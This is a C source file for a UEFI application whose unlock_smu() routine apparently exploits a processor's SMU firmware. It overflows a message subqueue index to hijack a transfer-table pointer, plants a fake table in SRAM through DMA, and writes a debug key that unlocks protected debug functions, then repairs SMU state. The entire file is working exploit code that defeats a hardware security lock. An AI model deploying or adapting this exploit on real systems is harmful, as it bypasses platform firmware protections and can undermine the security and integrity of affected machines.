#include "unlock.h"
#include "smu.h"
#include "msvc_compat.h"

static int _subq4_cur_idx = 0;

static int overwrite_tr_table_ptr(EFI_SYSTEM_TABLE *SystemTable, unsigned int b) {
    // ptr_slot = (0x19780 - 0x18850) / 16 = 243
    unsigned int ptr_slot = 243;
    int n = 30 - _subq4_cur_idx;
    if (n < 0) n = 0;

    for (int i = 0; i < n; i++) {
        unsigned int args[4] = {0, 0, 0, (1U << 24) | 4U};
        int st = smu_send_msg_q2(SystemTable, 0x23, args, 4);
        if (st != 0x01) return st;
    }

    unsigned int args_overflow[4] = {ptr_slot, 0, 0, (1U << 24) | 4U};
    int st = smu_send_msg_q2(SystemTable, 0x23, args_overflow, 4);
    if (st != 0x01) return st;

    unsigned int args_target[4] = {0, 0, b, (1U << 24) | 1U};
    st = smu_send_msg_q2(SystemTable, 0x23, args_target, 4);
    if (st != 0x01) return st;

    _subq4_cur_idx = 2;
    return 0x01;
}

EFI_STATUS unlock_smu(EFI_SYSTEM_TABLE *SystemTable) {
    _subq4_cur_idx = 0; // Reset subqueue index for unlock attempt

    EFI_PHYSICAL_ADDRESS dma_phys = 0;
    EFI_STATUS status = SystemTable->BootServices->AllocatePages(AllocateAnyPages, EfiBootServicesData, 1, &dma_phys);
    if (EFI_ERROR(status)) {
        print(SystemTable, L"Error: Failed to allocate DMA page for SMU unlock!\r\n");
        return status;
    }

    // Check current debug state
    unsigned int dbg_words[2] = {0, 0};
    int st = smu_read(SystemTable, 0x7B38, 2, dbg_words, dma_phys);
    if (st != 0x01) {
        print(SystemTable, L"Error: Failed to read SMU debug status!\r\n");
        SystemTable->BootServices->FreePages(dma_phys, 1);
        return EFI_DEVICE_ERROR;
    }

    unsigned int entry_byte = dbg_words[0] & 0xFFU;
    unsigned int dbg_byte = dbg_words[1] & 0xFFU;

    if (dbg_byte == 0) {
        // Already unlocked
        SystemTable->BootServices->FreePages(dma_phys, 1);
        return EFI_SUCCESS;
    }

    if (entry_byte != 0) {
        print(SystemTable, L"Error: Unexpected SMU debug state (entry != 0)!\r\n");
        SystemTable->BootServices->FreePages(dma_phys, 1);
        return EFI_DEVICE_ERROR;
    }

    // Search for dead-zone P in SMU SRAM below 0x7B20
    unsigned int P = 0;
    unsigned char *sram_buf = NULL;
    status = SystemTable->BootServices->AllocatePool(EfiBootServicesData, 32768, (VOID **)&sram_buf);
    if (EFI_ERROR(status) || sram_buf == NULL) {
        print(SystemTable, L"Error: Failed to allocate SRAM cache buffer!\r\n");
        SystemTable->BootServices->FreePages(dma_phys, 1);
        return status;
    }

    for (int a = 0x7B3C - 72; a >= 0x3054 - 72; a -= 72) {
        unsigned int chunk[18];
        st = smu_read(SystemTable, (unsigned int)a, 18, chunk, dma_phys);
        if (st != 0x01) {
            print(SystemTable, L"Error: Failed to read SRAM during dead-zone scan!\r\n");
            SystemTable->BootServices->FreePool(sram_buf);
            SystemTable->BootServices->FreePages(dma_phys, 1);
            return EFI_DEVICE_ERROR;
        }

        unsigned char *chunk_bytes = (unsigned char *)chunk;
        for (int b = 0; b < 72; b++) {
            sram_buf[(unsigned int)a - 0x3000U + b] = chunk_bytes[b];
        }

        unsigned int min_c = (a + 0x1C > 0x3070) ? (unsigned int)(a + 0x1C) : 0x3070U;
        for (unsigned int c = 0x7B1CU; c >= min_c; c -= 4) {
            int all_zeros = 1;
            unsigned int start_off = c - 0x1C - 0x3000U;
            unsigned int end_off = c + 0x20 - 0x3000U;
            for (unsigned int off = start_off; off < end_off; off++) {
                if (sram_buf[off] != 0) {
                    all_zeros = 0;
                    break;
                }
            }
            if (all_zeros) {
                P = c;
                break;
            }
        }
        if (P != 0) {
            break;
        }
    }

    SystemTable->BootServices->FreePool(sram_buf);

    if (P == 0) {
        print(SystemTable, L"Error: No dead-zone base found below 0x7B20!\r\n");
        SystemTable->BootServices->FreePages(dma_phys, 1);
        return EFI_DEVICE_ERROR;
    }

    unsigned int N = (0x7B20U - P) / 4U;
    if (P + 0x18U + 4U * N != 0x7B38U || N == 0 || N > 65535U) {
        print(SystemTable, L"Error: Invalid dead-zone calculation!\r\n");
        SystemTable->BootServices->FreePages(dma_phys, 1);
        return EFI_DEVICE_ERROR;
    }

    // Stage the walk-table header (count 1, entry0 tag 0x13 count N)
    volatile unsigned int *dma_buf = PHYS_TO_PTR(volatile unsigned int *, dma_phys);
    for (int i = 0; i < 1024; i++) dma_buf[i] = 0;

    dma_buf[0] = 1;
    dma_buf[1] = 0; dma_buf[2] = 0; dma_buf[3] = 0; dma_buf[4] = 0; dma_buf[5] = 0;
    dma_buf[6] = 0x13U | (N << 16); // FAKE_ENTRY_KEY = 0x13
    dma_buf[7] = 0;

    // Step A: Switch to empty transfer table at P - 0x1C
    st = overwrite_tr_table_ptr(SystemTable, P - 0x1C);
    if (st != 0x01) {
        print(SystemTable, L"Error: Failed to overwrite TR_TABLE_PTR (step A)!\r\n");
        SystemTable->BootServices->FreePages(dma_phys, 1);
        return EFI_DEVICE_ERROR;
    }

    // Step B: Transfer fake table over P
    st = transfer_engine_dram2smu(SystemTable, dma_phys, 8, 3);
    if (st != 0x01) {
        print(SystemTable, L"Error: DMA transfer of fake table failed!\r\n");
        SystemTable->BootServices->FreePages(dma_phys, 1);
        return EFI_DEVICE_ERROR;
    }

    // Verify fake table landed in SRAM using direct smu2dram (sub 0x14)
    unsigned int dma_args[6] = {0x14, (unsigned int)(dma_phys >> 32), (unsigned int)(dma_phys & 0xFFFFFFFF), 8, 0, 0};
    st = smu_send_msg_q2(SystemTable, 0x0A, dma_args, 6);
    if (st != 0x01) {
        print(SystemTable, L"Error: DMA readback of fake table failed!\r\n");
        SystemTable->BootServices->FreePages(dma_phys, 1);
        return EFI_DEVICE_ERROR;
    }

    volatile unsigned char *chk = PHYS_TO_PTR(volatile unsigned char *, dma_phys);
    if (chk[0] != 1 || chk[0x18] != 0x13 || *(volatile unsigned short *)(chk + 0x1A) != (unsigned short)N) {
        print(SystemTable, L"Error: Fake transfer table verification failed!\r\n");
        SystemTable->BootServices->FreePages(dma_phys, 1);
        return EFI_DEVICE_ERROR;
    }

    // Step C: Switch to fake transfer table at P & write debug key to 0x7B3C
    dma_buf[0] = 0;
    st = overwrite_tr_table_ptr(SystemTable, P);
    if (st != 0x01) {
        print(SystemTable, L"Error: Failed to overwrite TR_TABLE_PTR (step C)!\r\n");
        SystemTable->BootServices->FreePages(dma_phys, 1);
        return EFI_DEVICE_ERROR;
    }

    st = transfer_engine_dram2smu(SystemTable, dma_phys, 1, 0x37); // NEW_ENTRY_KEY = 0x37
    if (st != 0x01) {
        print(SystemTable, L"Error: DMA transfer of key to 0x7B3C failed!\r\n");
        SystemTable->BootServices->FreePages(dma_phys, 1);
        return EFI_DEVICE_ERROR;
    }

    // Check if debug functions are now unlocked
    unsigned int probe_val = 0;
    st = sec_smn_read32(SystemTable, SMN_CORE_MASK_ADDR, &probe_val);
    if (st == 0xFD || st < 0) {
        print(SystemTable, L"Error: Probe check failed - SMU unlock did not take effect!\r\n");
        SystemTable->BootServices->FreePages(dma_phys, 1);
        return EFI_DEVICE_ERROR;
    }

    // Fixup SMU state
    smu_memset32(SystemTable, 0x7950, 0, 19);   // 0x4C / 4 = 19 words (staged zone)
    smu_memset32(SystemTable, 0x18DF0, 0, 124); // 0x1F0 / 4 = 124 words (ring slots + counters)

    smu_write32(SystemTable, 0x7B38, 0);
    smu_write32(SystemTable, 0x19780, 0x3F794);
    smu_write32(SystemTable, 0x19784, 0x3E000);
    smu_write32(SystemTable, 0x19788, 0);
    smu_write32(SystemTable, 0x1978C, 0);
    smu_write32(SystemTable, 0x17E1C, 0x8B08);

    SystemTable->BootServices->FreePages(dma_phys, 1);
    return EFI_SUCCESS;
}
